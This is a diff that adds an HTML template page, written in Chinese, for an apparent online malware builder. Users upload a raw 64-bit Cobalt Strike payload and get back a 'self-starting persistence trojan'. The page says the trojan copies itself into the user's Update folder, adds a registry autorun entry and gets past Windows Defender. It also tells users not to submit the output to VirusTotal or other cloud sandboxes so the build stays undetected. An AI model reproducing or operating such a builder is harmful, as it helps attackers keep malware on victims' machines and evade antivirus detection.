@@ -1,0 +1,42 @@
+{{template "usertop" .}}
+
+<script>
+    function Addself() {
+        var formData = new FormData($("#formup")[0]);
+        $.ajax({
+            type: "POST",
+            dataType: "json",
+            url: "/api/file/addself",
+            data: formData,
+            contentType: false,
+            processData: false,
+            success: function (result) {
+                var mes = JSON.parse(JSON.stringify(result));
+                alert(mes.message);
+                window.location.replace(mes.durl);
+            },
+            error: function (date) {
+                var mes = JSON.parse(JSON.stringify(date));
+                alert(mes.responseJSON.message);
+            }
+        });
+    }
+</script>
+<h3>简单的自启维权马</h3>
+<form id="formup" enctype="multipart/form-data" method="POST" class="btn btn-outline-secondary">
+    <input type="file" name="f1" value="上传">
+</form>
+
+<p>
+    <button type="button" onclick="Addself()" style="width: 90px;height: 40px;" class="btn btn-info">
+        ok
+    </button>
+</p>
+<p>服务器比较垃圾，点击生成后请耐心等待，切勿多次提交！</p>
+<p>如果生成成功的话，会返回下载地址。欢迎反馈和提供建议。为了长时间免杀，请不要上传杀毒网，如:vt,微步等云沙箱。</a>
+<p>使用说明:利用cs生成64位的raw格式的paylaod,是一个bin格式的文件，然后上传即可</a>
+<p></p>
+    <a>说明:1.会复制自身文件到当前用户的Update文件夹下   2.会进行注册表加自启行为     3.过不了360等软件(可过Defdender)~</a>
+</p>
+
+{{template "userfooter" .}}
